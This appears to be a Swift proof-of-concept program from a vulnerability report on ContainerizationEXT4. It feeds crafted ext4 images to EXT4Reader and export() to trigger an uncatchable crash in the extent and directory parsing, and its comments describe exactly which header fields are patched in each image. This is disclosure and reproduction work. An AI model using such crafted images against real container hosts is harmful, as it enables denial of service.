// ext4-crash-poc
//
// Standalone reproduction for: "Missing bounds checks in ContainerizationEXT4
// extent parsing crash the host process" (OE1107563755116).
//
// This calls the exact same public entry point that `container export` uses
// (see apple/container, Sources/Services/ContainerAPIService/Server/Containers/
// ContainersService.swift, exportRootfs(id:archive:), L916):
//
//     try EXT4.EXT4Reader(blockDevice: FilePath(rootfs)).export(archive: FilePath(archive))
//
// against poc.img, a real ext4 image (built with mke2fs/debugfs) whose single
// regular file's inline extent header has been patched so
// ExtentHeader.entries == 5 while ExtentHeader.magic/.depth are untouched
// (magic stays 0xF30A, depth stays 0). See README.md for exactly how poc.img
// was constructed and the raw byte offsets involved.
//
// Expected result on an affected build: a Swift runtime trap ("Fatal error:
// Range requires lowerBound <= upperBound" / out-of-range subdata) inside
// EXT4.EXT4Reader.getExtents(inode:), NOT a thrown, catchable Swift Error.
//
// Note on poc_root_construction.img specifically: EXT4Reader.init(blockDevice:)
// eagerly walks the whole tree starting from the root inode (EXT4.RootInode)
// to build self.tree, before init even returns. Since that image patches the
// ROOT inode's own extent header, the trap happens inside the
// `EXT4.EXT4Reader(blockDevice:)` call below -- you will not see the
// "Calling reader.export(archive:)" line print at all for that image. This is
// expected and arguably a stronger repro: it shows the crash is reachable
// from construction alone, not just from export().

import ContainerizationEXT4
import Foundation
import SystemPackage

let arguments = CommandLine.arguments
guard arguments.count >= 2 else {
    print("""
        usage: ext4-crash-poc <path-to-image> [output-archive-path]

        Point this at one of:
          poc.img                       -- extent header entries=5 on a regular file (Bug 1: getExtents, depth=0)
          poc_root_construction.img     -- same bug, on the ROOT inode -- crashes inside
                                            EXT4Reader(blockDevice:) itself, before export()
                                            is even called (see comment above / README)
          poc_depth1.img                -- same class of bug, one level down: the depth==1
                                            index-node branch (Bug 1b: getExtents, depth=1)
          poc_dirbug_recordlength.img   -- dir record-length gap    (Bug 2a: getDirEntries)
          poc_dirbug_namelength.img     -- dir nameLength gap       (Bug 2b: getDirEntries)
        """)
    exit(1)
}

let imagePath = arguments[1]
let archivePath = arguments.count >= 3 ? arguments[2] : NSTemporaryDirectory() + "ext4-crash-poc-out.tar"

print("[*] Opening \(imagePath) with EXT4.EXT4Reader(blockDevice:)")
let reader = try EXT4.EXT4Reader(blockDevice: FilePath(imagePath))

print("[*] Calling reader.export(archive:) -- same call EXT4Reader+Export.swift")
print("    makes internally, and the same call ContainersService.exportRootfs")
print("    makes for `container export`. This walks the tree, which calls")
print("    getDirTree -> getDirEntries for every directory, and getExtents(inode:)")
print("    for every regular file -- so whichever image you pass in will hit")
print("    the corresponding vulnerable code path during the walk.")
print("[*] If the process is still printing after this line, that specific")
print("    code path is validating its bounds and this image's bug is fixed.\n")

try reader.export(archive: FilePath(archivePath))

print("[*] export() returned normally -- no crash. Wrote \(archivePath)")
